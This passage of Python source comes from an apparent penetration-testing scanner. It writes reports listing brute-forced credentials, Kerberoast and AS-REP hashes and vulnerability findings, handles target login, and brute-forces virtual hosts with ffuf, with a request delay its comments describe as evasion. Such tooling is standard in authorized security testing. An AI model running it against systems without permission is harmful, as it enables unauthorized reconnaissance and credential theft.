        "active_directory_computers": len(((SCAN_DATA.get("active_directory") or {}).get("ldap") or {}).get("computers", [])),
        "active_directory_credentials": len((((SCAN_DATA.get("active_directory") or {}).get("nxc") or {}).get("bruteforce") or {}).get("credentials", [])),
        "active_directory_asrep_hashes": len((((SCAN_DATA.get("active_directory") or {}).get("impacket") or {}).get("asrep_roast") or {}).get("hashes", [])),
        "active_directory_kerberoast_hashes": len((((SCAN_DATA.get("active_directory") or {}).get("impacket") or {}).get("kerberoast") or {}).get("hashes", [])),
    }
    SCAN_DATA["stats"] = scan_stats

    report_data = {
        "tool": VERSION,
        "target": TARGET_URL,
        "date": time.strftime('%Y-%m-%d %H:%M:%S'),
        "findings": list(FINDINGS),
        "scan_data": _to_serializable(SCAN_DATA),
    }

    saved = []
    errors = []
    try:
        with open(txt_file, 'w', encoding='utf-8') as f:
            f.write(f"GHOST Scanner v{VERSION} - Scan Report\n")
            f.write(f"Target   : {TARGET_URL}\n")
            f.write(f"Date     : {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Auth mode: {'Yes' if AUTHENTICATED else 'No'}\n")
            f.write("=" * 60 + "\n\n")

            f.write("[SUMMARY]\n")
            for k, v in scan_stats.items():
                f.write(f"- {k}: {v}\n")
            f.write("\n")

            general = report_data["scan_data"].get("general", {})
            f.write("[GENERAL INFORMATION]\n")
            f.write(f"- Status: {general.get('status_code', 'N/A')}\n")
            f.write(f"- Server: {general.get('server', 'N/A')}\n")
            techs = general.get('technologies', [])
            if techs:
                if isinstance(techs[0], dict):
                    tech_str = ', '.join(f"{t.get('name','')}{'['+t.get('detail','')+']' if t.get('detail') else ''}" for t in techs)
                else:
                    tech_str = ', '.join(str(t) for t in techs)
            else:
                tech_str = 'N/A'
            f.write(f"- Technologies: {tech_str}\n")
            f.write(f"- HTTP Methods: {', '.join(report_data['scan_data'].get('http_methods', [])) or 'N/A'}\n")
            f.write(f"- robots/sitemap: {', '.join(report_data['scan_data'].get('robots_paths', [])) or 'N/A'}\n\n")

            nmap_data = report_data['scan_data'].get('nmap') or {}
            nmap_ports = nmap_data.get('ports') or []
            f.write("[PORT SCAN (NMAP)]\n")
            if nmap_data.get('command'):
                f.write(f"- Command: {nmap_data['command']}\n")
            if nmap_data.get('host'):
                f.write(f"- Host: {nmap_data['host']}\n")
            if nmap_ports:
                for p in nmap_ports:
                    parts = [p.get('product', ''), p.get('version', ''), p.get('extrainfo', '')]
                    version_str = ' '.join(v for v in parts if v).strip()
                    f.write(
                        f"- {p.get('port')}/{p.get('protocol')} [{p.get('state', '')}] "
                        f"{p.get('service', '') or '?'}"
                        + (f" — {version_str}" if version_str else "")
                        + "\n"
                    )
            else:
                f.write("- No visible ports\n")
            f.write("\n")

            nse_results = nmap_data.get('nse_results') or []
            f.write("[TARGETED NMAP NSE]\n")
            nse_cmd = (nmap_data.get('nse') or {}).get('command')
            if nse_cmd:
                f.write(f"- Command: {nse_cmd}\n")
            if nse_results:
                for item in nse_results:
                    f.write(
                        f"- {item.get('port')}/{item.get('protocol')} {item.get('service') or '?'} "
                        f"{item.get('script_id')}: {item.get('output', '').splitlines()[0] if item.get('output') else ''}\n"
                    )
            else:
                f.write("- No NSE results\n")
            f.write("\n")

            f.write("[ENUMERATION]\n")
            f.write(f"- Users: {', '.join(report_data['scan_data'].get('users', [])) or 'N/A'}\n")
            f.write(f"- Emails: {', '.join(report_data['scan_data'].get('emails', [])) or 'N/A'}\n\n")

            wordpress_data = report_data['scan_data'].get('wordpress') or {}
            f.write("[WORDPRESS / WPSCAN]\n")
            if wordpress_data:
                wp_version = wordpress_data.get('version') or {}
                wp_theme = wordpress_data.get('main_theme') or {}
                f.write(f"- Detected: {'Yes' if wordpress_data.get('detected') else 'Not confirmed'}\n")
                f.write(f"- Version: {wp_version.get('number') or 'N/A'} ({wp_version.get('status') or 'unknown status'})\n")
                f.write(f"- Main theme: {wp_theme.get('name') or 'N/A'}\n")
                f.write(f"- Plugins detected: {len(wordpress_data.get('plugins') or [])}\n")
                f.write(f"- WPScan users: {', '.join(u.get('username','') for u in wordpress_data.get('users', []) if isinstance(u, dict)) or 'N/A'}\n")
                wp_vulns = wordpress_data.get('vulnerabilities') or []
                f.write(f"- Vulnerabilities: {len(wp_vulns)}\n")
                for vuln in wp_vulns:
                    f.write(
                        f"  * [{vuln.get('component_type')}] {vuln.get('component')}: "
                        f"{vuln.get('title')}"
                        + (f" (fixed in {vuln.get('fixed_in')})" if vuln.get('fixed_in') else "")
                        + "\n"
                    )
                wp_creds = wordpress_data.get('credentials') or []
                if wp_creds:
                    f.write("- WPScan credentials:\n")
                    for cred in wp_creds:
                        f.write(f"  * {cred.get('username')}:{cred.get('password')}\n")
            else:
                f.write("- Not executed\n")
            f.write("\n")

            spider = report_data["scan_data"].get("spider", {})
            f.write("[SPIDERING]\n")
            f.write(f"- Total URLs: {spider.get('total_urls', 0)}\n")
            f.write(f"- Total parameters: {spider.get('total_params', 0)}\n")
            f.write(f"- Total forms: {spider.get('total_forms', 0)}\n")
            for u in spider.get('sample_urls', []):
                f.write(f"  * {u}\n")
            f.write("\n")

            f.write("[ENDPOINTS API]\n")
            for ep in report_data['scan_data'].get('api_endpoints', []):
                f.write(f"- [{ep.get('status')}] {ep.get('url')} ({ep.get('content_type', '')})\n")
            f.write("\n")

            f.write("[SUBDOMAINS (VHOSTS)]\n")
            vhosts_list = report_data['scan_data'].get('vhosts', [])
            if vhosts_list:
                for v in vhosts_list:
                    fqdn = v.get('fqdn') or v.get('subdomain', '')
                    f.write(f"- [{v.get('status')}] {fqdn} size={v.get('size', 'N/A')}\n")
            else:
                f.write("- None\n")
            f.write("\n")

            f.write("[DIRECTORIES FOUND]\n")
            for hit in report_data['scan_data'].get('directory_hits', []):
                f.write(f"- [{hit.get('status')}] {hit.get('url')} size={hit.get('size', 'N/A')}\n")
            f.write("\n")

            f.write("[BRUTEFORCE CREDENTIALS]\n")
            creds = report_data['scan_data'].get('bruteforce_credentials', [])
            if creds:
                for cred in creds:
                    f.write(f"- {cred.get('username')}:{cred.get('password')}\n")
            else:
                f.write("- None\n")
            f.write("\n")

            src_code_data = report_data['scan_data'].get('source_code_analysis') or {}
            src_code_findings = src_code_data.get('findings') or []
            f.write("[SOURCE CODE ANALYSIS]\n")
            f.write(f"- Pages analyzed: {src_code_data.get('pages_analyzed', 0)}\n")
            f.write(f"- JS/JSON assets analyzed: {src_code_data.get('assets_analyzed', 0)}\n")
            f.write(f"- Findings: {len(src_code_findings)}\n")
            sev_stats = src_code_data.get('summary') or {}
            if sev_stats:
                f.write(
                    f"- Severity: CRITICAL={sev_stats.get('critical',0)} "
                    f"HIGH={sev_stats.get('high',0)} "
                    f"MEDIUM={sev_stats.get('medium',0)} "
                    f"LOW={sev_stats.get('low',0)}\n"
                )
            if src_code_findings:
                src_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}
                for item in sorted(src_code_findings,
                                   key=lambda x: src_order.get(x.get('severity', 'low'), 9)):
                    f.write(
                        f"- [{(item.get('severity') or '').upper()}] {item.get('type','')} "
                        f"@ {item.get('url','')} | value: {item.get('value','')}\n"
                    )
            else:
                f.write("- None\n")
            f.write("\n")

            ad_data = report_data['scan_data'].get('active_directory') or {}
            f.write("[ACTIVE DIRECTORY]\n")
            if ad_data:
                ad_ldap = ad_data.get('ldap') or {}
                ad_nxc = ad_data.get('nxc') or {}
                ad_imp = ad_data.get('impacket') or {}
                asrep_hashes = (ad_imp.get('asrep_roast') or {}).get('hashes') or []
                kerberoast_hashes = (ad_imp.get('kerberoast') or {}).get('hashes') or []
                ad_creds = ((ad_nxc.get('bruteforce') or {}).get('credentials') or [])
                f.write(f"- DC: {ad_data.get('target') or 'N/A'}\n")
                f.write(f"- Domain: {ad_data.get('domain') or 'N/A'}\n")
                f.write(f"- Base DN: {ad_data.get('base_dn') or 'N/A'}\n")
                f.write(f"- Mode: {ad_data.get('auth_mode') or 'N/A'}\n")
                f.write(f"- Kerbrute valid users: {len((ad_data.get('kerbrute') or {}).get('valid_users') or [])}\n")
                f.write(f"- LDAP users: {len(ad_ldap.get('users') or [])}\n")
                f.write(f"- LDAP groups: {len(ad_ldap.get('groups') or [])}\n")
                f.write(f"- LDAP computers: {len(ad_ldap.get('computers') or [])}\n")
                f.write(f"- AS-REP roastable: {len(asrep_hashes)}\n")
                for h in asrep_hashes:
                    f.write(f"  * {h.get('username') or '-'} {h.get('hash') or ''}\n")
                f.write(f"- Kerberoastable SPNs: {len(kerberoast_hashes)}\n")
                for h in kerberoast_hashes:
                    f.write(f"  * {h.get('username') or '-'} {h.get('hash') or ''}\n")
                f.write(f"- NXC credentials: {len(ad_creds)}\n")
                for cred in ad_creds:
                    f.write(f"  * {cred.get('username')}:{cred.get('password')}\n")
            else:
                f.write("- Not executed\n")
            f.write("\n")

            f.write("[FINDINGS]\n")
            if FINDINGS:
                for finding in FINDINGS:
                    f.write(finding + "\n")
            else:
                f.write("No findings recorded.\n")

            nuclei_summary = report_data["scan_data"].get("nuclei_summary", {})
            nuclei_findings_list = report_data["scan_data"].get("nuclei_findings", []) or []
            sev_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4, 'unknown': 5}
            if nuclei_summary:
                f.write("\n[NUCLEI] Vulnerability summary:\n")
                for sev in sorted(nuclei_summary.keys(), key=lambda s: sev_order.get(s, 99)):
                    tids = nuclei_summary[sev]
                    f.write(f"- {sev.upper()}: {len(tids)} findings ({', '.join(tids)})\n")
            if nuclei_findings_list:
                f.write("\n[NUCLEI] Findings detail:\n")
                sorted_findings = sorted(
                    nuclei_findings_list,
                    key=lambda x: (sev_order.get((x.get('severity') or 'unknown'), 99),
                                   x.get('template_id', ''))
                )
                for n in sorted_findings:
                    sev = (n.get('severity') or 'unknown').upper()
                    tid = n.get('template_id', '')
                    name = n.get('name', '')
                    url = n.get('url', '')
                    f.write(f"- [{sev}] {tid}" + (f" — {name}" if name else "") +
                            (f" @ {url}" if url else "") + "\n")

        saved.append(("TXT", txt_file))
    except Exception as e:
        errors.append(("TXT", e))

    try:
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
        saved.append(("JSON", json_file))
    except Exception as e:
        errors.append(("JSON", e))

    try:
        html_content = _build_html_report(report_data)
        with open(html_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        saved.append(("HTML", html_file))
    except Exception as e:
        errors.append(("HTML", e))

    try:
        md_content = _build_markdown_report(report_data)
        with open(md_file, 'w', encoding='utf-8') as f:
            f.write(md_content)
        saved.append(("MD", md_file))
    except Exception as e:
        errors.append(("MD", e))

    if saved:
        base_path = os.path.splitext(txt_file)[0]
        exts = ",".join(fmt.lower() for fmt, _ in saved)
        print_good(f"Reports saved to {base_path}.{{{exts}}}")
    for fmt, err in errors:
        print_error(f"Could not generate {fmt} report: {err}")
    if not saved:
        print_error("Could not save any report format.")

def normalize_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url.rstrip('/')

def get_session(user_agent=None):
    session = requests.Session()
    session.headers.update({
        'User-Agent': user_agent or USER_AGENT or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/html, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
    })
    session.verify = VERIFY_TLS
    session.max_redirects = MAX_REDIRECTS

    # Apply CLI-supplied proxy (--proxy), extra headers (--header) and cookie
    # (--cookie) so every session in every module honors them consistently.
    if HTTP_PROXIES:
        session.proxies.update(HTTP_PROXIES)
    if EXTRA_HEADERS:
        session.headers.update(EXTRA_HEADERS)
    if COOKIE_STRING:
        _apply_cookie_string_to_session(session, COOKIE_STRING)

    # Apply the global inter-request delay (--delay) and a default timeout to
    # every request made through this session. This makes evasion/throttling
    # work across all modules (spider, injection, API, ...) instead of only the
    # brute-force loops, and prevents a missing timeout from hanging a scan.
    _orig_request = session.request

    def _request(method, url, **kwargs):
        if REQUEST_DELAY > 0:
            time.sleep(REQUEST_DELAY)
        kwargs.setdefault("timeout", DEFAULT_TIMEOUT)
        return _orig_request(method, url, **kwargs)

    session.request = _request
    return session

def _apply_cookie_string_to_session(session, cookie_string, target_url=None):
    """Load a Cookie string into requests.Session and default headers."""
    cookie_string = (cookie_string or "").strip()
    if not session or not cookie_string:
        return
    session.headers["Cookie"] = cookie_string
    parsed = urlparse(target_url or TARGET_URL or "")
    domain = parsed.hostname or None
    for chunk in cookie_string.split(";"):
        if "=" not in chunk:
            continue
        name, value = chunk.split("=", 1)
        name = name.strip()
        value = value.strip()
        if not name:
            continue
        try:
            if domain:
                session.cookies.set(name, value, domain=domain)
            else:
                session.cookies.set(name, value)
        except Exception:
            session.cookies.set(name, value)

def _session_header_value(session, name):
    if not session:
        return ""
    wanted = name.lower()
    for k, v in getattr(session, "headers", {}).items():
        if str(k).lower() == wanted:
            return str(v)
    return ""

def _external_http_headers_from_session(session):
    """Return useful headers for external CLIs to respect the web session."""
    if not session:
        return []
    headers = []
    user_agent = _session_header_value(session, "User-Agent")
    if user_agent:
        headers.append(("User-Agent", user_agent))
    authorization = _session_header_value(session, "Authorization")
    if authorization:
        headers.append(("Authorization", authorization))
    cookie_string = _session_cookie_string(session) or _session_header_value(session, "Cookie")
    if cookie_string:
        headers.append(("Cookie", cookie_string))
    for name in ("X-CSRF-Token", "X-XSRF-TOKEN", "X-Requested-With"):
        value = _session_header_value(session, name)
        if value:
            headers.append((name, value))
    seen = set()
    unique = []
    for name, value in headers:
        key = name.lower()
        if key in seen or not value:
            continue
        seen.add(key)
        unique.append((name, value))
    return unique

def _append_ffuf_session_headers(cmd, session, skip_headers=None):
    skip = {str(h).lower() for h in (skip_headers or [])}
    for name, value in _external_http_headers_from_session(session):
        if name.lower() in skip:
            continue
        cmd += ["-H", f"{name}: {value}"]
    return cmd

def _append_nuclei_session_headers(cmd, session):
    for name, value in _external_http_headers_from_session(session):
        cmd += ["-H", f"{name}: {value}"]
    return cmd

def _append_whatweb_session_options(cmd, session):
    if not session:
        return cmd
    user_agent = _session_header_value(session, "User-Agent")
    if user_agent:
        cmd += ["--user-agent", user_agent]
    for name, value in _external_http_headers_from_session(session):
        if name.lower() == "user-agent":
            continue
        cmd += ["--header", f"{name}: {value}"]
    return cmd

def _auth_cookie_names(session):
    names = []
    try:
        for cookie in session.cookies:
            if cookie.name:
                names.append(cookie.name)
    except Exception:
        pass
    if not names:
        cookie_header = _session_header_value(session, "Cookie")
        for part in cookie_header.split(";"):
            if "=" in part:
                names.append(part.split("=", 1)[0].strip())
    return sorted(set(n for n in names if n))

def _record_auth_context(method, login_url, username, session, response=None, notes=None):
    SCAN_DATA["authentication"] = {
        "authenticated": True,
        "method": method,
        "login_url": login_url,
        "username": username or "",
        "cookie_names": _auth_cookie_names(session),
        "authorization_header": bool(_session_header_value(session, "Authorization")),
        "status_code": getattr(response, "status_code", None),
        "final_url": getattr(response, "url", "") if response is not None else "",
        "notes": notes or [],
    }

def _looks_authenticated_response(response, login_url, username=""):
    if response is None or response.status_code >= 400:
        return False
    body = (response.text or "").lower()
    final_path = urlparse(getattr(response, "url", "") or "").path.rstrip("/")
    login_path = urlparse(login_url or "").path.rstrip("/")
    success_markers = ("logout", "sign out", "dashboard", "welcome", "my account", "profile")
    if any(marker in body for marker in success_markers):
        return True
    if username and username.lower() in body:
        return True
    if final_path and login_path and final_path != login_path and "password" not in body[:5000]:
        return True
    if response.history and "password" not in body[:5000]:
        return True
    return False

def check_seclists():
    if os.path.exists(SECLISTS_SMALL):
        return SECLISTS_SMALL
    elif os.path.exists(SECLISTS_MEDIUM):
        print_warning("Small wordlist not found, using medium (larger and slower).")
        return SECLISTS_MEDIUM
    else:
        print_warning("SecLists not found at default paths.")
        response = input_path(f"Install SecLists automatically? (requires sudo) [y/N]: ").strip().lower()
        if response in ('y', 'yes'):
            try:
                print_info("Running: sudo apt update && sudo apt install seclists -y")
                subprocess.run(["sudo", "apt", "update"], check=True, capture_output=True)
                subprocess.run(["sudo", "apt", "install", "seclists", "-y"], check=True, capture_output=True)
                if os.path.exists(SECLISTS_SMALL):
                    print_good("SecLists installed successfully.")
                    return SECLISTS_SMALL
                elif os.path.exists(SECLISTS_MEDIUM):
                    return SECLISTS_MEDIUM
                else:
                    print_error("Installation appears to have failed.")
            except Exception as e:
                print_error(f"Could not install SecLists: {e}")
        print_warning("Using reduced internal wordlist for fuzzing.")
        return None

def setup_authentication():
    global AUTHENTICATED, AUTH_SESSION, TARGET_URL
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Use a manually obtained session cookie/token? [y/N]:")
    manual_mode = input("> ").strip().lower() in ('y', 'yes')
    if manual_mode:
        temp_session = get_session()
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Full cookie (e.g. PHPSESSID=...; csrftoken=...):")
        cookie_string = input("> ").strip()
        if cookie_string:
            _apply_cookie_string_to_session(temp_session, cookie_string, TARGET_URL)
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Optional Authorization header (e.g. Bearer ey...; empty to skip):")
        authorization = input("> ").strip()
        if authorization:
            temp_session.headers["Authorization"] = authorization
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Optional extra headers Name: value (empty line to finish):")
        while True:
            extra = input("> ").strip()
            if not extra:
                break
            if ":" not in extra:
                print_warning("Invalid format. Use Name: value")
                continue
            name, value = extra.split(":", 1)
            if name.strip() and value.strip():
                temp_session.headers[name.strip()] = value.strip()
        try:
            resp = temp_session.get(TARGET_URL, timeout=DEFAULT_TIMEOUT)
            AUTH_SESSION = temp_session
            AUTHENTICATED = True
            _record_auth_context("manual-session", TARGET_URL, "", temp_session, response=resp)
            print_good("Manual session loaded. Compatible tools will use cookies/headers.")
            return
        except Exception as e:
            AUTH_SESSION = temp_session
            AUTHENTICATED = True
            _record_auth_context("manual-session", TARGET_URL, "", temp_session, notes=[str(e)])
            print_warning("Could not validate manual session, but it was loaded for future tests.")
            return
    print_info("Authentication configuration")
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Login URL (leave empty if same as target):")
    login_url = input("> ").strip()
    if not login_url:
        login_url = TARGET_URL
    else:
        login_url = normalize_url(login_url)
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Username:")
    username = input("> ")
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Password:")
    password = getpass.getpass("> ")

    temp_session = get_session()
    try:
        resp = temp_session.get(login_url, auth=(username, password), timeout=DEFAULT_TIMEOUT)
        if resp.status_code == 200:
            print_good("Basic Auth authentication successful")
            AUTH_SESSION = temp_session
            AUTHENTICATED = True
            _record_auth_context("basic-auth", login_url, username, temp_session, response=resp)
            return
    except requests.RequestException as e:
        print_warning(f"Basic Auth not applicable ({type(e).__name__}). Trying forms...")

    try:
        resp = temp_session.get(login_url, timeout=DEFAULT_TIMEOUT)
        if HAS_BS4:
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action')
                method = form.get('method', 'get').upper()
                inputs = form.find_all(['input', 'textarea'])
                user_field = None
                pass_field = None
                for inp in inputs:
                    name = inp.get('name', '').lower()
                    if 'user' in name or 'email' in name or 'login' in name:
                        user_field = inp.get('name')
                    if 'pass' in name:
                        pass_field = inp.get('name')
                if user_field and pass_field and method == 'POST':
                    form_url = urljoin(login_url, action) if action else login_url
                    data = {user_field: username, pass_field: password}
                    for inp in inputs:
                        if inp.get('type') == 'hidden' and inp.get('name'):
                            data[inp.get('name')] = inp.get('value', '')
                        elif inp.get('type') in ('submit', 'button') and inp.get('name') and inp.get('value'):
                            data.setdefault(inp.get('name'), inp.get('value', ''))
                    resp2 = temp_session.post(form_url, data=data, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
                    if _looks_authenticated_response(resp2, login_url, username):
                        print_good("Form-based authentication successful")
                        AUTH_SESSION = temp_session
                        AUTHENTICATED = True
                        _record_auth_context("form-login", form_url, username, temp_session, response=resp2)
                        return
                    else:
                        print_error("Authentication failed with detected form.")
    except Exception as e:
        print_error(f"Error during authentication: {e}")
    
    print_warning("Could not authenticate. Tests will run without authentication.")
    AUTHENTICATED = False
    AUTH_SESSION = None
    SCAN_DATA["authentication"] = {"authenticated": False}

def get_active_session():
    global AUTH_SESSION, AUTHENTICATED
    if AUTHENTICATED and AUTH_SESSION:
        return AUTH_SESSION
    else:
        return get_session()

def safe_execute(func, *args, **kwargs):
    try:
        return func(*args, **kwargs)
    except KeyboardInterrupt:
        raise
    except Exception as e:
        print_error(f"Error in {func.__name__}: {str(e)[:100]}")
        return None

def gather_info(target, session):
    try:
        info = {}
        resp = session.get(target, timeout=DEFAULT_TIMEOUT)
        info['status_code'] = resp.status_code
        info['headers'] = dict(resp.headers)
        info['cookies'] = resp.cookies
        info['server'] = resp.headers.get('Server', 'Not disclosed')

        print_info("Detecting technologies with WhatWeb...")
        ww_result = run_whatweb(target, session)
        if ww_result is not None:
            info['technologies'] = ww_result
            info['technologies_source'] = 'whatweb'
        else:
            tech = []
            if 'Set-Cookie' in resp.headers and 'PHPSESSID' in resp.headers['Set-Cookie']:
                tech.append('PHP')
            if 'X-Powered-By' in resp.headers:
                tech.append(resp.headers['X-Powered-By'])
            if 'ASP.NET' in str(resp.headers):
                tech.append('ASP.NET')
            info['technologies'] = list(set(tech))
            info['technologies_source'] = 'headers'
            if info['technologies']:
                print_info(f"Technologies (fallback): {', '.join(info['technologies'])}")

        return info
    except Exception as e:
        print_error(f"Could not gather information: {e}")
        return None

def check_robots_sitemap(target, session):
    try:
        paths = []
        for p in ['/robots.txt', '/sitemap.xml']:
            url = urljoin(target, p)
            try:
                resp = session.get(url, timeout=DEFAULT_TIMEOUT)
                if resp.status_code == 200:
                    print_good(f"Found: {url}")
                    paths.append(url)
                    if 'robots.txt' in p:
                        lines = resp.text.splitlines()
                        for line in lines:
                            if line.startswith('Disallow:') or line.startswith('Allow:'):
                                parts = line.split(':')
                                if len(parts) > 1:
                                    path = parts[1].strip()
                                    if path and path != '/':
                                        print_info(f"  Path in robots.txt: {path}")
            except Exception:
                pass
        return paths
    except Exception as e:
        print_error(f"Error in check_robots_sitemap: {e}")
        return []

def check_http_methods(target, session):
    try:
        allowed = []
        resp = session.options(target, timeout=DEFAULT_TIMEOUT)
        if 'Allow' in resp.headers:
            allowed = [m.strip() for m in resp.headers['Allow'].split(',')]
            print_info(f"Allowed HTTP methods: {', '.join(allowed)}")
        trace_resp = session.request('TRACE', target, timeout=DEFAULT_TIMEOUT)
        if trace_resp.status_code == 200:
            print_vuln("TRACE method enabled (Cross-Site Tracing)")
            allowed.append('TRACE')
        return allowed
    except Exception as e:
        print_error(f"Error in check_http_methods: {e}")
        return []

def vhost_bruteforce(target, session, base_domain, wordlist=None, threads=THREADS,
                     use_ffuf=True, request_timeout=5, rate=0, use_fs_filter=True):
    """Subdomain fuzzing (virtual hosts) using ffuf with Content-Length technique.

    Sends a request with an invalid Host (defnotvalid.<base_domain>) to get the
    baseline length of "not found" and, if `use_fs_filter` is True, ffuf filters
    with `-fs <baseline>` discarding all matching responses.
    """
    results = []
    try:
        if not base_domain:
            print_error("Empty base domain. Cannot perform subdomain fuzzing.")
            return results

        if wordlist is None and os.path.isfile(SECLISTS_DNS):
            wordlist = SECLISTS_DNS
        if wordlist and not os.path.isfile(wordlist):
            print_warning(f"Could not read wordlist '{wordlist}'.")
            wordlist = None
        if not wordlist:
            print_error("No wordlist available for vhost fuzzing.")
            return results

        bogus_host = f"defnotvalid{int(time.time()) % 100000}.{base_domain}"
        baseline_size = None
        try:
            print_info(f"Baseline with invalid Host: {bogus_host}")
            base_resp = session.get(
                target,
                headers={"Host": bogus_host},
                timeout=DEFAULT_TIMEOUT,
                allow_redirects=False,
            )
            cl_header = base_resp.headers.get('Content-Length')
            if cl_header and cl_header.isdigit():
                baseline_size = int(cl_header)
            else:
                baseline_size = len(base_resp.content)
            print_info(f"Baseline status={base_resp.status_code} Content-Length={baseline_size}")
        except Exception as e:
            print_warning(f"Could not calculate baseline ({e}); ffuf will not filter by size.")

        if use_ffuf and check_ffuf():
            wl_count = 0
            try:
                with open(wordlist, 'r', encoding='utf-8', errors='ignore') as wlf:
                    for line in wlf:
                        s = line.strip()
                        if s and not s.startswith('#'):
                            wl_count += 1
            except Exception:
                pass
            if wl_count:
                est_seconds = max(1, int(wl_count / max(1, threads * 10)))
                est_min = est_seconds // 60
                eta = f"~{est_min}m" if est_min >= 1 else f"~{est_seconds}s"
                print_info(f"Wordlist: {wl_count:,} entries · threads: {threads} · timeout: {request_timeout}s · ETA: {eta}")
                if wl_count > 50_000 and threads < 40:
                    print_warning(
                        f"Large wordlist ({wl_count:,}) with few threads ({threads}). "
                        "Consider Ctrl+C and increasing threads or using a shorter wordlist."
                    )

            tmp_fd, tmp_path = tempfile.mkstemp(suffix='.json')
            os.close(tmp_fd)
            ffuf_cmd = [
                "ffuf",
                "-w", f"{wordlist}:FUZZ",
                "-u", target.rstrip('/') + '/',
                "-H", f"Host: FUZZ.{base_domain}",
                "-t", str(threads),
                "-timeout", str(request_timeout),
                "-o", tmp_path, "-of", "json",
            ]
            ffuf_cmd = _append_ffuf_session_headers(ffuf_cmd, session, skip_headers={"Host"})
            if rate and rate > 0:
                ffuf_cmd += ["-rate", str(rate)]
            if baseline_size is not None and use_fs_filter:
                ffuf_cmd += ["-fs", str(baseline_size)]
            print_info(f"Running: {' '.join(ffuf_cmd[:11])} ...")
            print()
            process = None
            try:
                process = subprocess.Popen(ffuf_cmd)
                process.wait()
                rc = process.returncode
                print()

                if os.path.isfile(tmp_path) and os.path.getsize(tmp_path) > 2:
                    try:
                        hits = _load_ffuf_json_results(tmp_path)
                        STATUS_COLOR = {
                            200: Fore.GREEN, 201: Fore.GREEN, 204: Fore.GREEN,
                            301: Fore.CYAN,  302: Fore.CYAN,  307: Fore.CYAN, 308: Fore.CYAN,
                            401: Fore.YELLOW, 403: Fore.YELLOW,
                            500: Fore.RED, 503: Fore.RED,
                        }
                        if not hits:
                            print(f"\n  {Fore.YELLOW}No subdomains found (all filtered by baseline).{Style.RESET_ALL}\n")
                        else:
                            table_rows = []
                            for hit in sorted(hits, key=lambda x: (x.get('status', 0), x.get('input', {}).get('FUZZ', ''))):
                                sub = hit.get('input', {}).get('FUZZ', '')
                                status = hit.get('status', 0)
                                size = hit.get('length', 0)
                                words_h = hit.get('words', 0)
                                dur_ns = hit.get('duration', 0)
                                dur_ms = dur_ns // 1_000_000 if dur_ns else 0
                                fqdn = f"{sub}.{base_domain}"
                                color = STATUS_COLOR.get(status, Fore.WHITE)
                                table_rows.append([
                                    f"{color}[{status}]{Style.RESET_ALL}",
                                    fqdn,
                                    f"{size:,}",
                                    f"{words_h:,}",
                                    f"{dur_ms}ms",
                                ])
                                results.append({
                                    'subdomain': sub,
                                    'fqdn': fqdn,
                                    'status': status,
                                    'size': size,
                                })
                                FINDINGS.append(f"[VHOST] {fqdn} [{status}]")
                            print_table(
                                headers=["STATUS", "VHOST", "SIZE", "WORDS", "DUR"],
                                rows=table_rows,
                                alignments=['<', '<', '>', '>', '>'],
                                footer=f"  Total: {Fore.GREEN}{len(hits)}{Style.RESET_ALL} subdomain(s) found\n",
                            )
                    except Exception as e:
                        print_error(f"Error reading ffuf JSON: {e}")
                if rc not in (0, 1):
                    print_error(f"ffuf exited with code {rc}")
            except KeyboardInterrupt:
                print_warning("Subdomain fuzzing interrupted by user; waiting for ffuf to save partial results...")
                if process:
                    _wait_for_interrupted_child(process, "ffuf")
                try:
                    existing = {(item.get('fqdn'), item.get('status')) for item in results}
                    for hit in sorted(_load_ffuf_json_results(tmp_path), key=lambda x: (x.get('status', 0), x.get('input', {}).get('FUZZ', ''))):
                        sub = hit.get('input', {}).get('FUZZ', '')
                        status = hit.get('status', 0)
                        size = hit.get('length', 0)
                        fqdn = f"{sub}.{base_domain}"
                        key = (fqdn, status)
                        if key in existing:
                            continue
                        existing.add(key)
                        results.append({
                            'subdomain': sub,
                            'fqdn': fqdn,
                            'status': status,
                            'size': size,
                        })
                        FINDINGS.append(f"[VHOST] {fqdn} [{status}]")
                except Exception as e:
                    print_error(f"Error reading partial ffuf JSON: {e}")
                print_good(f"{len(results)} vhosts found so far have been saved.")
                SCAN_DATA["vhosts"] = results
                return results
            except Exception as e:
                print_error(f"Error running ffuf: {e}")
            finally:
                try:
                    os.unlink(tmp_path)
                except Exception:
                    pass
            return results

        print_warning("ffuf not available, using internal method (slower).")
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                subs = [l.strip() for l in f if l.strip() and not l.startswith('#')]
        except Exception as e:
            print_error(f"Error reading wordlist: {e}")
            return results
        print_info(f"Testing {len(subs)} subdomains against {base_domain}...")

        def test_sub(sub):
            fqdn = f"{sub}.{base_domain}"
            try:
                r = session.get(target, headers={"Host": fqdn},
                                timeout=DEFAULT_TIMEOUT, allow_redirects=False)
                cl = r.headers.get('Content-Length')
                size = int(cl) if cl and cl.isdigit() else len(r.content)
                if baseline_size is not None and use_fs_filter and size == baseline_size:
                    return None
                return (sub, fqdn, r.status_code, size)
            except Exception:
                return None

        iterator = subs
        if HAS_TQDM:
            pbar = tqdm(total=len(subs), desc="VHost fuzzing", unit="req", ncols=80)
        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                for res in ex.map(test_sub, iterator):
                    if HAS_TQDM:
                        pbar.update(1)
                    if res:
                        sub, fqdn, status, size = res
                        print_good(f"[{status}] {fqdn} (size={size})")
                        results.append({'subdomain': sub, 'fqdn': fqdn,
                                        'status': status, 'size': size})
                        FINDINGS.append(f"[VHOST] {fqdn} [{status}]")
